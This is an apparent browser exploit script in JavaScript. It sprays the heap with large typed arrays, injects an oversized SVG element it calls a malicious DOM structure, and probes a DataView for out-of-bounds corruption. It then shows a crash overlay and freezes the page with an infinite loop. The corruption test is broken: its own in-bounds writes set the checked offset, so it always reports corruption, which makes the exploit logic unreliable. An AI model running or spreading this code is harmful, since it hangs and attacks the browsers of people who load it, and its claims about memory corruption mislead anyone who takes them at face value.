(() => {
  // 🔧 Global JS error hook
  window.onerror = (msg, src, line, col, err) => {
    console.log("❗ window.onerror —", msg, "at", line, col);
    document.title = "ERR";
    return true;
  };

  // 🛠️ Crash control via modified DOM
  function triggerCrash() {
    let crashDiv = document.createElement("div");
    crashDiv.style.cssText = "position:absolute;top:0;left:0;width:100px;height:100px;background:red;z-index:9999";
    crashDiv.textContent = "[CRASH]";
    document.body.appendChild(crashDiv);

    // Intentional freeze
    while (true) {}
  }

  // 🔫 Step 1: massive heap spray
  const heapspray = [];
  for (let i = 0; i < 20000; i++) {
    heapspray.push(new Float64Array(1000));
  }
  console.log("[1] Heap spray complete");

  // 🔫 Step 2: DOM structure targeting vulnerability
  const vuln = document.createElement("div");
  vuln.innerHTML = `<svg><g id="${"X".repeat(50000)}"></g></svg>`;
  document.body.appendChild(vuln);
  console.log("[2] Malicious DOM structure injected");

  // 🔫 Step 3: modifiable buffer
  const buf = new ArrayBuffer(0x1000);
  const dv = new DataView(buf);

  // 🕵️ Trying to detect a manipulable index
  let corrupted = false;

  // 🔫 Step 4: trial loop to trigger OOB / corruption
  for (let rep = 0; rep < 100; rep++) {
    try {
      // Slight buffer initialization
      for (let i = 0; i < 0x400; i++) {
        dv.setUint32(i * 2, 0x41414141, true);
      }
    } catch (e) {
      console.log("[!] Write exception:", e);
      break;
    }

    // 🧩 Read an "under-memory" offset to try detecting corruption
    let sentinel = dv.getUint32(0x400, true);

    if (sentinel !== 0) {
      console.log(`[+] Sentinel modified rep=${rep}, val=0x${sentinel.toString(16)}`);
      corrupted = true;
      break;
    }
  }

  if (corrupted) {
    console.log("✅ Corruption detected, triggering crash");
    triggerCrash();
  } else {
    console.log("🔄 No corruption detected.");
    document.title = "NO CORRUPT";
  }
})();
